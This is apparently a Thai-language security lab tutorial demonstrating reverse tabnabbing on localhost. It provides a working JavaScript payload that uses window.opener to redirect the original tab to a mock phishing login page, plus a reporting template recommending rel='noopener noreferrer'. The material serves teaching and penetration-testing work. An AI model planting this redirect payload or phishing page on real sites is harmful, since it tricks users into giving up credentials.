# Part 2 — Red Team: ตรวจจาก External Site และสร้าง PoC

บทนี้จำลองว่า Red Team ได้รับอนุญาตให้ควบคุม External Site บน Port `9000`

> Hacker ทั่วไปไม่สามารถโจมตีได้เพียงเพราะเห็น External Link แต่ต้องควบคุมปลายทาง, เจาะปลายทางได้ หรือมีวิธีรัน JavaScript บนปลายทางก่อน

## Architecture

```text
Trusted Site : http://localhost:8000/trusted-site/
External Site: http://localhost:9000/external-site/
```

## ไฟล์ที่ Red Team สร้าง

```text
demo/external-site/
├── index.html       # External Site และ JavaScript Payload
└── phishing.html    # หน้า Phishing จำลอง
```

## 1. สร้าง External Site แบบปกติก่อน

สร้าง `external-site/index.html`

```html
<!doctype html>
<html lang="th">
<head>
  <meta charset="utf-8">
  <title>Partner Security Blog</title>
</head>
<body>
  <h1>Partner Security Blog</h1>
  <p>External Site สำหรับ Lab</p>
</body>
</html>
```

เปิด Terminal อีกหน้าที่โฟลเดอร์ `demo`

```bash
python -m http.server 9000
```

ตอนนี้ Trusted Site และ External Site ทำงานพร้อมกันคนละ Origin

## 2. ตรวจช่องโหว่จากฝั่ง External Site

1. เปิด Trusted Site ที่ Port `8000`
2. กด External Link เพื่อเปิด Port `9000` ในแท็บใหม่
3. ที่ External Site เปิด DevTools Console
4. รัน

```js
Boolean(window.opener)
```

หากผลเป็น `true` แปลว่า External Site มี Reference กลับไปยัง Trusted Site

นี่คือจุดที่ Red Team ยืนยันช่องโหว่จากฝั่ง External Site โดยยังไม่ต้องแก้ Source ของ Trusted Site

## 3. เพิ่ม Payload ใน External Site

เพิ่มส่วนนี้ใน `external-site/index.html`

```html
<p id="status"></p>
<p id="countdown"></p>

<script>
  const status = document.querySelector("#status");
  const countdown = document.querySelector("#countdown");
  const hasOpener = Boolean(window.opener && !window.opener.closed);

  if (!hasOpener) {
    status.textContent = "ไม่พบ window.opener";
  } else {
    status.textContent = "พบ window.opener";
    countdown.textContent = "เปลี่ยนแท็บต้นทางใน 3 วินาที";

    setTimeout(() => {
      const phishingUrl = new URL("phishing.html", location.href);
      window.opener.location.href = phishingUrl.href;
    }, 3000);
  }
</script>
```

### Payload ทำอะไร

1. ตรวจ `window.opener` จาก External Site
2. สร้าง URL ของหน้า Phishing บน Port `9000`
3. เปลี่ยน Trusted Tab ให้ไปยัง URL นั้น

Cross-Origin ป้องกัน External Site จากการอ่าน DOM ของ Trusted Site แต่การสั่ง Navigation ผ่าน `window.opener.location` คือพฤติกรรมที่ Lab ต้องการสาธิต

## 4. สร้าง `external-site/phishing.html`

```html
<!doctype html>
<html lang="th">
<head>
  <meta charset="utf-8">
  <title>Phishing Simulation</title>
</head>
<body>
  <h1>Session หมดอายุ</h1>
  <p>กรอกข้อมูลมั่วเท่านั้น</p>

  <form id="login" autocomplete="off">
    <input name="username" placeholder="demo-user" required>
    <input name="password" type="password" placeholder="fake-password" required>
    <button>ส่งข้อมูลสมมติ</button>
  </form>

  <pre id="result"></pre>

  <script>
    const form = document.querySelector("#login");
    const result = document.querySelector("#result");

    form.addEventListener("submit", (event) => {
      event.preventDefault();
      const data = new FormData(form);

      result.textContent =
        `Username: ${data.get("username")}\n` +
        `Password: ${data.get("password")}`;
    });
  </script>
</body>
</html>
```

ข้อมูลอยู่ใน Browser เท่านั้น ไม่มี `fetch`, Backend, Database หรือ Storage

## 5. Execute PoC

1. เปิด Trusted Site บน Port `8000`
2. เปิด External Site ผ่านลิงก์
3. ยืนยันว่า External Site พบ `window.opener`
4. รอ 3 วินาที
5. กลับแท็บเดิม
6. URL ต้องเปลี่ยนจาก Port `8000` ไปหน้า Phishing บน Port `9000`
7. กรอกข้อมูลสมมติและตรวจผล

## 6. Evidence

- URL Trusted Site และ External Site
- ค่า `Boolean(window.opener)`
- Source ของ External Link
- URL ก่อนและหลัง Redirect
- Browser และ Version
- Screenshot ที่ใช้ข้อมูลสมมติเท่านั้น

## 7. Finding

```markdown
## Reverse Tabnabbing ผ่าน External Link

### Preconditions
Attacker ต้องควบคุมหรือรัน JavaScript บน External Site ได้

### Root Cause
Trusted Site เปิด External Site โดยไม่แยก window.opener

### Impact
External Site สามารถเปลี่ยน Trusted Tab เป็นหน้า Phishing

### Recommendation
ใช้ rel="noopener noreferrer" และเพิ่ม Regression Test
```

ส่ง Finding และ PoC ให้ Blue Team โดยไม่แก้ Trusted Site ในช่วง Red Team
